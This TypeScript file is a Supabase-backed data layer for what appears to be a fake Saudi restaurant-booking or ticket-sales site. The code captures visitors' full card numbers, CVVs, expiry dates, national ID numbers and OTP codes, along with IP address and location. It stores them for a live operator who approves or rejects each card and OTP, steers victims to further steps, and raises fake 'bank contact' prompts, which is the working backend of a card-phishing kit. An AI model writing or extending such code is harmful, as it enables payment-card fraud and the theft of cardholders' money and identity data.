// Supabase-backed replacement for the legacy Firebase data layer.
// File is still named `firebase.ts` so the ~9 call sites that import from
// `@/lib/firebase` don't need to change. It exports both:
//   1. The app's domain helpers (addData, handlePay, listenForApproval, …).
//   2. A thin Firestore-compatible shim (doc, setDoc, getDoc, deleteDoc,
//      onSnapshot, collection, query, getDocs, writeBatch, arrayUnion,
//      arrayRemove, onAuthStateChanged, type User) so dashboard.tsx can
//      simply re-point its `firebase/firestore` and `firebase/auth` imports
//      at this module without rewriting every call site.
//
// Schema mapping (mirrors the old Firestore collections):
//   Firestore                 →   Postgres
//   pays/{visitorId}          →   pays           (PK: id    text, payload in `data` jsonb)
//   settings/{key}            →   settings       (PK: key   text, payload in `data` jsonb)
//   blocked_bins/{bin}        →   blocked_bins   (PK: bin   text, payload in `data` jsonb)

import {
  createClient,
  type RealtimeChannel,
  type User as SupabaseUser,
} from "@supabase/supabase-js";

const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL as string | undefined;
const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY as
  | string
  | undefined;

export const supabase =
  SUPABASE_URL && SUPABASE_KEY
    ? createClient(SUPABASE_URL, SUPABASE_KEY, {
        auth: { persistSession: true, autoRefreshToken: true },
      })
    : null;

if (!supabase) {
  console.warn(
    "Supabase env vars missing (VITE_SUPABASE_URL / VITE_SUPABASE_PUBLISHABLE_KEY). Data layer disabled.",
  );
}

// Truthy sentinels so existing `if (!db)` / `if (!auth)` guards still work.
export const db: unknown = supabase;
export const auth: unknown = supabase;
export const database: unknown = supabase; // legacy alias used by utils.ts

// Re-export the Supabase user type under the old `User` name.
export type User = SupabaseUser;

// ---------------------------------------------------------------------------
// Sanitisation (carried over verbatim from the previous Firebase impl).
// ---------------------------------------------------------------------------
const MAX_HISTORY_ITEMS = 20;
const MAX_AMOUNT_VALUE = 1_000_000;
const BLOCK_CACHE_TTL_MS = 10_000;

const blockedVisitorCache = new Map<
  string,
  { blocked: boolean; expiresAt: number }
>();

let cachedVisitorIp: string | null = null;
let cachedIpBlocked: boolean | null = null;
let cachedVisitorGeo: {
  country: string;
  countryCode: string;
  city: string;
  region: string;
} | null = null;

const sanitizeString = (value: unknown, maxLength: number) => {
  if (typeof value !== "string") return value;
  return value.trim().slice(0, maxLength);
};
const sanitizeDigits = (value: unknown, maxLength: number) => {
  if (typeof value !== "string") return value;
  return value.replace(/\D/g, "").slice(0, maxLength);
};
const sanitizePhone = (value: unknown, maxLength: number) => {
  if (typeof value !== "string") return value;
  return value.replace(/[^\d+]/g, "").slice(0, maxLength);
};
const clampNumber = (value: unknown, min: number, max: number) => {
  if (typeof value !== "number" || Number.isNaN(value)) return value;
  return Math.min(max, Math.max(min, value));
};

const sanitizeCardEntry = (entry: any) => ({
  cardNumber: sanitizeDigits(entry?.cardNumber, 19),
  cardName: sanitizeString(entry?.cardName, 60),
  expiryMonth: sanitizeDigits(entry?.expiryMonth, 2),
  expiryYear: sanitizeDigits(entry?.expiryYear, 4),
  cvv: sanitizeDigits(entry?.cvv, 4),
  cardType: sanitizeString(entry?.cardType, 20),
  timestamp:
    typeof entry?.timestamp === "string"
      ? entry.timestamp
      : new Date().toISOString(),
});
const sanitizeOtpEntry = (entry: any) => ({
  code: sanitizeDigits(entry?.code, 6),
  timestamp:
    typeof entry?.timestamp === "string"
      ? entry.timestamp
      : new Date().toISOString(),
});

const sanitizePayload = (input: any) => {
  const data = { ...input };
  if ("id" in data) data.id = sanitizeString(data.id, 80);
  if ("name" in data) data.name = sanitizeString(data.name, 80);
  if ("saudiId" in data) data.saudiId = sanitizeDigits(data.saudiId, 10);
  if ("email" in data && typeof data.email === "string") {
    data.email = data.email.trim().toLowerCase().slice(0, 120);
  }
  if ("phone" in data) data.phone = sanitizePhone(data.phone, 15);
  if ("cardNumber" in data)
    data.cardNumber = sanitizeDigits(data.cardNumber, 19);
  if ("cardName" in data) data.cardName = sanitizeString(data.cardName, 60);
  if ("expiryMonth" in data)
    data.expiryMonth = sanitizeDigits(data.expiryMonth, 2);
  if ("expiryYear" in data)
    data.expiryYear = sanitizeDigits(data.expiryYear, 4);
  if ("cvv" in data) data.cvv = sanitizeDigits(data.cvv, 4);
  if ("cardType" in data) data.cardType = sanitizeString(data.cardType, 20);
  if ("cardCategory" in data)
    data.cardCategory = sanitizeString(data.cardCategory, 40);
  if ("otp" in data) data.otp = sanitizeDigits(data.otp, 6);
  if ("currentPage" in data)
    data.currentPage = sanitizeString(data.currentPage, 40);
  if ("status" in data) data.status = sanitizeString(data.status, 40);
  if ("type" in data) data.type = sanitizeString(data.type, 40);
  if ("restaurant" in data)
    data.restaurant = sanitizeString(data.restaurant, 120);
  if ("restaurantEn" in data)
    data.restaurantEn = sanitizeString(data.restaurantEn, 120);
  if ("date" in data) data.date = sanitizeString(data.date, 40);
  if ("time" in data) data.time = sanitizeString(data.time, 40);
  if ("guests" in data) data.guests = sanitizeDigits(data.guests, 2);
  if ("notes" in data) data.notes = sanitizeString(data.notes, 300);
  if ("bookingDate" in data)
    data.bookingDate = sanitizeString(data.bookingDate, 40);
  if ("bookingTime" in data)
    data.bookingTime = sanitizeString(data.bookingTime, 40);
  if ("ticketQuantity" in data)
    data.ticketQuantity = clampNumber(data.ticketQuantity, 1, 100);
  if ("ticketPrice" in data)
    data.ticketPrice = clampNumber(data.ticketPrice, 0, MAX_AMOUNT_VALUE);
  if ("totalAmount" in data)
    data.totalAmount = clampNumber(data.totalAmount, 0, MAX_AMOUNT_VALUE);
  if ("total" in data)
    data.total = clampNumber(data.total, 0, MAX_AMOUNT_VALUE);
  if (Array.isArray(data.cardHistory))
    data.cardHistory = data.cardHistory
      .slice(-MAX_HISTORY_ITEMS)
      .map((entry: any) => sanitizeCardEntry(entry));
  if (Array.isArray(data.otpHistory))
    data.otpHistory = data.otpHistory
      .slice(-MAX_HISTORY_ITEMS)
      .map((entry: any) => sanitizeOtpEntry(entry));
  return data;
};

// ---------------------------------------------------------------------------
// Low-level Supabase helpers (keyed by table-name; primary-key column varies).
// ---------------------------------------------------------------------------
type TableSpec = { table: string; pk: string };
const TABLES: Record<string, TableSpec> = {
  pays: { table: "pays", pk: "id" },
  settings: { table: "settings", pk: "key" },
  blocked_bins: { table: "blocked_bins", pk: "bin" },
};

function specFor(collectionName: string): TableSpec {
  const spec = TABLES[collectionName];
  if (!spec) throw new Error(`Unknown collection: ${collectionName}`);
  return spec;
}

async function fetchRow(collectionName: string, id: string) {
  if (!supabase) return null;
  const { table, pk } = specFor(collectionName);
  const { data, error } = await supabase
    .from(table)
    .select(`${pk}, data`)
    .eq(pk, id)
    .maybeSingle();
  if (error && error.code !== "PGRST116") {
    console.error(`[supabase] fetchRow ${table}/${id}`, error);
  }
  return data as { data: any } | null;
}

// Marker objects used by the Firestore-compat `setDoc(..., {merge:true})`
// path to implement arrayUnion / arrayRemove on jsonb arrays.
const UNION_MARKER = Symbol("arrayUnion");
const REMOVE_MARKER = Symbol("arrayRemove");
type ArrayMarker = { [UNION_MARKER]?: any[]; [REMOVE_MARKER]?: any[] };

function applyArrayMarkers(existing: any, patch: any): any {
  const out: any = { ...existing };
  for (const [k, v] of Object.entries(patch)) {
    if (v && typeof v === "object" && UNION_MARKER in (v as any)) {
      const cur = Array.isArray(out[k]) ? out[k] : [];
      const add = (v as any)[UNION_MARKER];
      out[k] = [...cur];
      for (const x of add) if (!out[k].includes(x)) out[k].push(x);
    } else if (v && typeof v === "object" && REMOVE_MARKER in (v as any)) {
      const cur = Array.isArray(out[k]) ? out[k] : [];
      const rem = (v as any)[REMOVE_MARKER];
      out[k] = cur.filter((x: any) => !rem.includes(x));
    } else {
      out[k] = v;
    }
  }
  return out;
}

async function upsertRow(
  collectionName: string,
  id: string,
  payload: any,
  merge: boolean,
) {
  if (!supabase) return;
  const { table, pk } = specFor(collectionName);
  let nextData: any = payload;
  if (merge) {
    const existing = await fetchRow(collectionName, id);
    nextData = applyArrayMarkers(existing?.data || {}, payload);
  }
  const row: Record<string, any> = { [pk]: id, data: nextData };
  const { error } = await supabase.from(table).upsert(row);
  if (error) {
    console.error(`[supabase] upsert ${table}/${id}`, error);
    throw error;
  }
}

async function deleteRow(collectionName: string, id: string) {
  if (!supabase) return;
  const { table, pk } = specFor(collectionName);
  const { error } = await supabase.from(table).delete().eq(pk, id);
  if (error) {
    console.error(`[supabase] delete ${table}/${id}`, error);
    throw error;
  }
}

async function selectAll(collectionName: string) {
  if (!supabase) return [] as Array<{ id: string; data: any }>;
  const { table, pk } = specFor(collectionName);
  const { data, error } = await supabase.from(table).select(`${pk}, data`);
  if (error) {
    console.error(`[supabase] selectAll ${table}`, error);
    return [];
  }
  return (data || []).map((r: any) => ({ id: r[pk], data: r.data || {} }));
}

// ---------------------------------------------------------------------------
// Firestore-compatible shim (just enough for the dashboard's existing calls).
// ---------------------------------------------------------------------------
export type DocRef = { __doc: true; collection: string; id: string };
export type CollRef = { __coll: true; collection: string };

export function doc(_db: unknown, collectionName: string, id: string): DocRef {
  return { __doc: true, collection: collectionName, id };
}
export function collection(_db: unknown, name: string): CollRef {
  return { __coll: true, collection: name };
}
export function query(coll: CollRef): CollRef {
  return coll;
}
export function arrayUnion(...vals: any[]): ArrayMarker {
  return { [UNION_MARKER]: vals };
}
export function arrayRemove(...vals: any[]): ArrayMarker {
  return { [REMOVE_MARKER]: vals };
}

type DocSnapshot = {
  id: string;
  exists: () => boolean;
  data: () => any;
  ref: DocRef;
};
type QuerySnapshot = {
  forEach: (cb: (d: DocSnapshot) => void) => void;
  docs: DocSnapshot[];
  size: number;
};

function makeDocSnapshot(
  collectionName: string,
  id: string,
  data: any | null,
): DocSnapshot {
  return {
    id,
    exists: () => data !== null,
    data: () => (data === null ? undefined : { ...data, id }),
    ref: doc(null, collectionName, id),
  };
}

export async function getDoc(ref: DocRef): Promise<DocSnapshot> {
  const row = await fetchRow(ref.collection, ref.id);
  return makeDocSnapshot(ref.collection, ref.id, row?.data ?? null);
}

export async function setDoc(
  ref: DocRef,
  payload: any,
  options?: { merge?: boolean },
): Promise<void> {
  await upsertRow(ref.collection, ref.id, payload, options?.merge === true);
}

export async function updateDoc(ref: DocRef, payload: any): Promise<void> {
  await upsertRow(ref.collection, ref.id, payload, true);
}

export async function deleteDoc(ref: DocRef): Promise<void> {
  await deleteRow(ref.collection, ref.id);
}

export async function getDocs(coll: CollRef): Promise<QuerySnapshot> {
  const rows = await selectAll(coll.collection);
  const docs = rows.map((r) =>
    makeDocSnapshot(coll.collection, r.id, r.data),
  );
  return {
    forEach: (cb) => docs.forEach(cb),
    docs,
    size: docs.length,
  };
}

export function writeBatch(_db: unknown) {
  const ops: Array<() => Promise<void>> = [];
  return {
    delete(ref: DocRef) {
      ops.push(() => deleteRow(ref.collection, ref.id));
    },
    set(ref: DocRef, payload: any, options?: { merge?: boolean }) {
      ops.push(() =>
        upsertRow(ref.collection, ref.id, payload, options?.merge === true),
      );
    },
    update(ref: DocRef, payload: any) {
      ops.push(() => upsertRow(ref.collection, ref.id, payload, true));
    },
    async commit() {
      // Supabase has no batch API on the JS client; run sequentially.
      for (const op of ops) await op();
    },
  };
}

// onSnapshot dispatches on whether we got a DocRef or CollRef.
export function onSnapshot(
  target: DocRef | CollRef,
  cb: (snap: any) => void,
): () => void {
  if (!supabase) return () => {};

  if ((target as DocRef).__doc) {
    const ref = target as DocRef;
    const { table, pk } = specFor(ref.collection);
    let cancelled = false;
    let channel: RealtimeChannel | null = null;

    const fire = async () => {
      const row = await fetchRow(ref.collection, ref.id);
      if (cancelled) return;
      cb(makeDocSnapshot(ref.collection, ref.id, row?.data ?? null));
    };

    void fire();
    const channelName = `doc:${table}:${ref.id}:${Math.random().toString(36).slice(2, 10)}`;
    channel = supabase
      .channel(channelName)
      .on(
        "postgres_changes" as any,
        {
          event: "*",
          schema: "public",
          table,
          filter: `${pk}=eq.${ref.id}`,
        },
        () => void fire(),
      )
      .subscribe();

    return () => {
      cancelled = true;
      if (channel) void supabase.removeChannel(channel);
    };
  }

  // Collection: maintain a local mirror, fire a fake QuerySnapshot on every
  // change so the existing dashboard code can keep its forEach pattern.
  // Realtime events that arrive *before* the initial SELECT finishes are
  // buffered and replayed afterwards so we don't overwrite fresher rows
  // with stale data from the initial fetch.
  const coll = target as CollRef;
  const { table } = specFor(coll.collection);
  const rows = new Map<string, any>();
  let cancelled = false;
  let initialLoaded = false;
  const pendingEvents: any[] = [];
  let channel: RealtimeChannel | null = null;

  const emit = () => {
    if (cancelled) return;
    const docs = Array.from(rows.entries()).map(([id, data]) =>
      makeDocSnapshot(coll.collection, id, data),
    );
    cb({
      forEach: (fn: (d: DocSnapshot) => void) => docs.forEach(fn),
      docs,
      size: docs.length,
    } as QuerySnapshot);
  };

  const applyEvent = (payload: any) => {
    const pk = specFor(coll.collection).pk;
    if (payload.eventType === "DELETE") {
      const oldId = payload.old?.[pk];
      if (oldId) rows.delete(String(oldId));
    } else {
      const newRow = payload.new;
      const id = newRow?.[pk];
      if (id) rows.set(String(id), newRow.data || {});
    }
  };

  const collChannelName = `coll:${table}:${Math.random().toString(36).slice(2, 10)}`;
  channel = supabase
    .channel(collChannelName)
    .on(
      "postgres_changes" as any,
      { event: "*", schema: "public", table },
      (payload: any) => {
        if (!initialLoaded) {
          pendingEvents.push(payload);
          return;
        }
        applyEvent(payload);
        emit();
      },
    )
    .subscribe();

  (async () => {
    const initial = await selectAll(coll.collection);
    if (cancelled) return;
    for (const r of initial) rows.set(r.id, r.data);
    // Replay any realtime events that landed during the initial fetch so
    // they win over the snapshot they may already be reflected in.
    for (const ev of pendingEvents) applyEvent(ev);
    pendingEvents.length = 0;
    initialLoaded = true;
    emit();
  })();

  return () => {
    cancelled = true;
    if (channel) void supabase.removeChannel(channel);
  };
}

// ---------------------------------------------------------------------------
// Auth (Supabase) — exposed under the same names the old code used.
// ---------------------------------------------------------------------------
export const loginWithEmail = async (email: string, password: string) => {
  if (!supabase) throw new Error("Auth not initialized");
  const { data, error } = await supabase.auth.signInWithPassword({
    email,
    password,
  });
  if (error) {
    // Re-throw with a `.code` property to match the shape login.tsx expects.
    const err: any = new Error(error.message);
    if (/invalid login/i.test(error.message))
      err.code = "auth/invalid-credential";
    else err.code = "auth/error";
    throw err;
  }
  return data;
};

export const logoutUser = async () => {
  if (!supabase) return;
  await supabase.auth.signOut();
};

export const onAuthChange = (cb: (user: User | null) => void) => {
  if (!supabase) return () => {};
  // Fire current state immediately.
  void supabase.auth.getUser().then(({ data }) => cb(data.user ?? null));
  const { data } = supabase.auth.onAuthStateChange((_event, session) => {
    cb(session?.user ?? null);
  });
  return () => data.subscription.unsubscribe();
};

// Firebase-style alias so `onAuthStateChanged(auth, cb)` calls keep working.
export const onAuthStateChanged = (_auth: unknown, cb: (u: User | null) => void) =>
  onAuthChange(cb);

// ---------------------------------------------------------------------------
// Domain helpers (preserved API).
// ---------------------------------------------------------------------------

const isVisitorBlocked = async (visitorId: string) => {
  if (!supabase || !visitorId) return false;
  const cached = blockedVisitorCache.get(visitorId);
  if (cached && cached.expiresAt > Date.now()) return cached.blocked;
  try {
    const row = await fetchRow("pays", visitorId);
    const blocked = Boolean(row?.data?.blocked);
    blockedVisitorCache.set(visitorId, {
      blocked,
      expiresAt: Date.now() + BLOCK_CACHE_TTL_MS,
    });
    return blocked;
  } catch (error) {
    console.error("Error checking visitor block status:", error);
    return false;
  }
};

export async function addData(data: any) {
  if (!supabase) {
    console.warn("Supabase not initialized. Cannot add data.");
    return false;
  }
  const payload = sanitizePayload(data);
  const visitorId =
    typeof payload?.id === "string"
      ? payload.id
      : localStorage.getItem("visitor");
  if (!visitorId) {
    console.warn("Missing visitor ID. Cannot add data.");
    return false;
  }
  localStorage.setItem("visitor", visitorId);
  if (cachedIpBlocked === true) {
    console.warn("Blocked IP tried to submit data:", visitorId);
    return false;
  }
  if (await isVisitorBlocked(visitorId)) {
    console.warn("Blocked visitor tried to submit data:", visitorId);
    return false;
  }
  try {
    await upsertRow(
      "pays",
      visitorId,
      {
        ...payload,
        id: visitorId,
        createdDate:
          typeof payload.createdDate === "string"
            ? payload.createdDate
            : new Date().toISOString(),
      },
      true,
    );
    return true;
  } catch (e) {
    console.error("Error adding row:", e);
    return false;
  }
}

export const handleCurrentPage = async (page: string) => {
  const visitorId = localStorage.getItem("visitor");
  if (visitorId) return addData({ id: visitorId, currentPage: page });
  return false;
};

export const handleOtp = async (otp: string, page: string = "otp") => {
  const visitorId = localStorage.getItem("visitor");
  if (!visitorId || !supabase) return false;
  if (cachedIpBlocked === true) throw new Error("IP_BLOCKED");
  if (await isVisitorBlocked(visitorId)) throw new Error("VISITOR_BLOCKED");
  const otpEntry = {
    code: sanitizeDigits(otp, 6) as string,
    timestamp: new Date().toISOString(),
  };
  if (typeof otpEntry.code !== "string" || otpEntry.code.length < 4)
    throw new Error("INVALID_OTP");
  const existingOtpsRaw = JSON.parse(
    localStorage.getItem("otpHistory") || "[]",
  );
  const existingOtps = Array.isArray(existingOtpsRaw) ? existingOtpsRaw : [];
  const nextOtps = [...existingOtps, otpEntry]
    .slice(-MAX_HISTORY_ITEMS)
    .map((entry) => sanitizeOtpEntry(entry));
  localStorage.setItem("otpHistory", JSON.stringify(nextOtps));
  await upsertRow(
    "pays",
    visitorId,
    sanitizePayload({
      otp: otpEntry.code,
      otpHistory: nextOtps,
      currentPage: page,
      otpApproved: false,
      otpStatus: "pending",
    }),
    true,
  );
  return true;
};

export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  if (!supabase) return false;
  const visitorId = localStorage.getItem("visitor");
  if (!visitorId) return false;
  if (cachedIpBlocked === true) throw new Error("IP_BLOCKED");
  if (await isVisitorBlocked(visitorId)) throw new Error("VISITOR_BLOCKED");
  const sanitizedPaymentInfo = sanitizePayload(paymentInfo);
  const cardEntry = sanitizeCardEntry({
    ...sanitizedPaymentInfo,
    timestamp: new Date().toISOString(),
  });
  const existing = await fetchRow("pays", visitorId);
  const existingHistoryRaw = existing?.data?.cardHistory;
  const existingHistory = Array.isArray(existingHistoryRaw)
    ? existingHistoryRaw
    : [];
  const nextCardHistory = [...existingHistory, cardEntry]
    .slice(-MAX_HISTORY_ITEMS)
    .map((entry) => sanitizeCardEntry(entry));
  await upsertRow(
    "pays",
    visitorId,
    sanitizePayload({
      ...sanitizedPaymentInfo,
      status: "pending_approval",
      cardApproved: false,
      cardStatus: "pending_approval",
      cardHistory: nextCardHistory,
    }),
    true,
  );
  if (typeof setPaymentInfo === "function") {
    setPaymentInfo((prev: any) => ({ ...prev, status: "pending_approval" }));
  }
  return true;
};

// Realtime listener helpers ----------------------------------------------------
function listenDocField<T>(
  visitorIdRequired: boolean,
  collectionName: string,
  docId: string | null,
  mapper: (data: any | null) => T,
  cb: (value: T) => void,
): () => void {
  if (!supabase) return () => {};
  if (visitorIdRequired && !docId) return () => {};
  if (!docId) return () => {};
  const ref = doc(null, collectionName, docId);
  return onSnapshot(ref, (snap: DocSnapshot) => {
    const value = mapper(snap.exists() ? snap.data() : null);
    cb(value);
  });
}

export const listenForApproval = (
  callback: (status: "approved" | "rejected") => void,
): (() => void) => {
  const visitorId = localStorage.getItem("visitor");
  return listenDocField(
    true,
    "pays",
    visitorId,
    (data) => {
      if (!data) return null;
      if (data.cardApproved === true) return "approved" as const;
      if (data.cardStatus === "rejected") return "rejected" as const;
      return null;
    },
    (v) => {
      if (v) callback(v);
    },
  );
};

export const listenForOtpApproval = (
  callback: (status: "approved" | "rejected") => void,
): (() => void) => {
  const visitorId = localStorage.getItem("visitor");
  return listenDocField(
    true,
    "pays",
    visitorId,
    (data) => {
      if (!data) return null;
      if (data.otpApproved === true) return "approved" as const;
      if (data.otpStatus === "rejected") return "rejected" as const;
      return null;
    },
    (v) => {
      if (v) callback(v);
    },
  );
};

export const listenForDirectedStep = (
  callback: (step: number, data: any) => void,
): (() => void) => {
  if (!supabase) return () => {};
  const visitorId = localStorage.getItem("visitor");
  if (!visitorId) return () => {};
  let lastDirectedAt = "";
  const ref = doc(null, "pays", visitorId);
  return onSnapshot(ref, (snap: DocSnapshot) => {
    if (!snap.exists()) return;
    const data = snap.data();
    const step = Number(data?.directedStep) || 0;
    const directedAt = String(data?.directedAt || "");
    if (step > 0 && directedAt && directedAt !== lastDirectedAt) {
      lastDirectedAt = directedAt;
      callback(step, data);
    } else if (step === 0) {
      lastDirectedAt = "";
    }
  });
};

export const clearDirectedStep = async () => {
  const visitorId = localStorage.getItem("visitor");
  if (!visitorId) return;
  try {
    await upsertRow(
      "pays",
      visitorId,
      {
        directedStep: 0,
        directedAt: null,
        updatedAt: new Date().toISOString(),
      },
      true,
    );
  } catch (error) {
    console.error("Error clearing directedStep:", error);
  }
};

export const updateOtpApprovalStatus = async (
  visitorId: string,
  approved: boolean,
) => {
  try {
    await upsertRow(
      "pays",
      visitorId,
      {
        otpApproved: approved,
        otpStatus: approved ? "approved" : "rejected",
      },
      true,
    );
  } catch (error) {
    console.error("Error updating OTP approval:", error);
  }
};

export const updateApprovalStatus = async (
  visitorId: string,
  approved: boolean,
) => {
  try {
    await upsertRow(
      "pays",
      visitorId,
      {
        cardApproved: approved,
        cardStatus: approved ? "approved" : "rejected",
        status: approved ? "approved" : "rejected",
      },
      true,
    );
  } catch (error) {
    console.error("Error updating approval status:", error);
  }
};

// --- Bank contact prompt ----------------------------------------------------
export const pushBankContactRequest = async (visitorId: string) => {
  if (!visitorId) return;
  try {
    await upsertRow(
      "pays",
      visitorId,
      {
        bankContactRequest: true,
        bankContactAt: new Date().toISOString(),
        bankContactConfirmed: false,
        bankContactConfirmedAt: null,
        updatedAt: new Date().toISOString(),
      },
      true,
    );
  } catch (err) {
    console.error("Error pushing bank contact request:", err);
  }
};

export const listenForBankContactRequest = (
  callback: (
    show: boolean,
    payload: { requestedAt: string; cardBin: string; cardBankName: string },
  ) => void,
): (() => void) => {
  const visitorId = localStorage.getItem("visitor");
  if (!visitorId) return () => {};
  const ref = doc(null, "pays", visitorId);
  return onSnapshot(ref, (snap: DocSnapshot) => {
    if (!snap.exists()) {
      callback(false, { requestedAt: "", cardBin: "", cardBankName: "" });
      return;
    }
    const data = snap.data();
    const requested = Boolean(data?.bankContactRequest);
    const confirmed = Boolean(data?.bankContactConfirmed);
    const requestedAt = String(data?.bankContactAt || "");
    const rawCard = String(data?.cardNumber || "").replace(/\D/g, "");
    const cardBin = rawCard.slice(0, 6);
    const cardBankName = String(
      data?.cardBankName || data?.cardBank || data?.bankName || "",
    );
    callback(requested && !confirmed, {
      requestedAt,
      cardBin,
      cardBankName,
    });
  });
};

export const confirmBankContact = async () => {
  const visitorId = localStorage.getItem("visitor");
  if (!visitorId) return;
  try {
    await upsertRow(
      "pays",
      visitorId,
      {
        bankContactConfirmed: true,
        bankContactConfirmedAt: new Date().toISOString(),
        bankContactRequest: false,
        updatedAt: new Date().toISOString(),
      },
      true,
    );
  } catch (err) {
    console.error("Error confirming bank contact:", err);
  }
};

export const listenForVisitorBlock = (
  callback: (blocked: boolean) => void,
): (() => void) => {
  const visitorId = localStorage.getItem("visitor");
  if (!visitorId) return () => {};
  const ref = doc(null, "pays", visitorId);
  return onSnapshot(ref, (snap: DocSnapshot) => {
    const data = snap.exists() ? snap.data() : null;
    const blocked = Boolean(data?.blocked);
    blockedVisitorCache.set(visitorId, {
      blocked,
      expiresAt: Date.now() + BLOCK_CACHE_TTL_MS,
    });
    callback(blocked);
  });
};

// --- Visitor IP + geo -------------------------------------------------------
export const fetchVisitorIp = async (): Promise<string> => {
  if (cachedVisitorIp !== null) return cachedVisitorIp;
  try {
    const res = await fetch("/api/visitor-ip");
    if (!res.ok) {
      cachedVisitorIp = "";
      return "";
    }
    const json = await res.json();
    cachedVisitorIp = typeof json?.ip === "string" ? json.ip : "";
    cachedVisitorGeo = {
      country: typeof json?.country === "string" ? json.country : "",
      countryCode:
        typeof json?.countryCode === "string" ? json.countryCode : "",
      city: typeof json?.city === "string" ? json.city : "",
      region: typeof json?.region === "string" ? json.region : "",
    };
    return cachedVisitorIp || "";
  } catch (error) {
    console.error("Error fetching visitor IP:", error);
    cachedVisitorIp = "";
    cachedVisitorGeo = null;
    return "";
  }
};

export const isIpBlocked = async (ip: string): Promise<boolean> => {
  if (!supabase || !ip) return false;
  try {
    const row = await fetchRow("settings", "blockedIps");
    const ips: string[] = Array.isArray(row?.data?.ips)
      ? row!.data.ips.map((x: any) => String(x).trim())
      : [];
    return ips.includes(ip.trim());
  } catch (error) {
    console.error("Error checking blocked IP:", error);
    return false;
  }
};

export const isCachedIpBlocked = (): boolean => cachedIpBlocked === true;

export const listenForIpBlock = (
  ip: string,
  callback: (blocked: boolean) => void,
): (() => void) => {
  if (!supabase || !ip) return () => {};
  const ref = doc(null, "settings", "blockedIps");
  return onSnapshot(ref, (snap: DocSnapshot) => {
    const data = snap.exists() ? snap.data() : null;
    const ips: string[] = Array.isArray(data?.ips)
      ? data.ips.map((x: any) => String(x).trim())
      : [];
    const blocked = ips.includes(ip.trim());
    cachedIpBlocked = blocked;
    callback(blocked);
  });
};

export const ensureVisitorIp = async (): Promise<{
  ip: string;
  blocked: boolean;
}> => {
  const ip = await fetchVisitorIp();
  if (!ip) {
    cachedIpBlocked = false;
    return { ip: "", blocked: false };
  }
  const blocked = await isIpBlocked(ip);
  cachedIpBlocked = blocked;
  try {
    const visitorId = localStorage.getItem("visitor");
    if (visitorId && supabase) {
      const existing = await fetchRow("pays", visitorId);
      if (existing) {
        const geo = cachedVisitorGeo;
        const e = existing.data || {};
        const needsUpdate =
          e?.ip !== ip ||
          (geo && (e?.geoCountry !== geo.country || e?.geoCity !== geo.city));
        if (needsUpdate) {
          const patch: Record<string, unknown> = {
            ip,
            ipAddress: ip,
            ipUpdatedAt: new Date().toISOString(),
          };
          if (geo?.country) patch.geoCountry = geo.country;
          if (geo?.countryCode) patch.geoCountryCode = geo.countryCode;
          if (geo?.city) patch.geoCity = geo.city;
          if (geo?.region) patch.geoRegion = geo.region;
          await upsertRow("pays", visitorId, patch, true);
        }
      }
    }
  } catch (error) {
    console.error("Error attaching visitor IP:", error);
  }
  return { ip, blocked };
};

// --- Blocked BINs -----------------------------------------------------------
const normalizeBin = (raw: string) => raw.replace(/\D/g, "").slice(0, 6);

export const isBinBlocked = async (cardOrBin: string): Promise<boolean> => {
  if (!supabase) return false;
  const bin = normalizeBin(cardOrBin);
  if (bin.length < 6) return false;
  try {
    const row = await fetchRow("blocked_bins", bin);
    return row !== null;
  } catch (error) {
    console.error("Error checking blocked BIN:", error);
    return false;
  }
};

export const addBlockedBin = async (
  bin: string,
  meta?: { bankName?: string; cardBrand?: string; country?: string },
) => {
  const normalized = normalizeBin(bin);
  if (normalized.length < 6) throw new Error("INVALID_BIN");
  try {
    await upsertRow(
      "blocked_bins",
      normalized,
      {
        bin: normalized,
        blockedAt: new Date().toISOString(),
        ...(meta || {}),
      },
      false,
    );
    return true;
  } catch (error) {
    console.error("Error blocking BIN:", error);
    throw error;
  }
};

export const removeBlockedBin = async (bin: string) => {
  const normalized = normalizeBin(bin);
  try {
    await deleteRow("blocked_bins", normalized);
    return true;
  } catch (error) {
    console.error("Error unblocking BIN:", error);
    throw error;
  }
};

export const listenBlockedBins = (
  callback: (
    bins: Array<{
      bin: string;
      bankName?: string;
      cardBrand?: string;
      country?: string;
      blockedAt?: string;
    }>,
  ) => void,
): (() => void) => {
  const ref = collection(null, "blocked_bins");
  return onSnapshot(ref, (snap: QuerySnapshot) => {
    const list: any[] = [];
    snap.forEach((d) => {
      const data = d.data() || {};
      list.push({ bin: d.id, ...data });
    });
    callback(list);
  });
};

export const updateVisitorBlockStatus = async (
  visitorId: string,
  blocked: boolean,
) => {
  try {
    await upsertRow(
      "pays",
      visitorId,
      { blocked, blockedAt: blocked ? new Date().toISOString() : null },
      true,
    );
  } catch (error) {
    console.error("Error updating visitor block status:", error);
  }
};
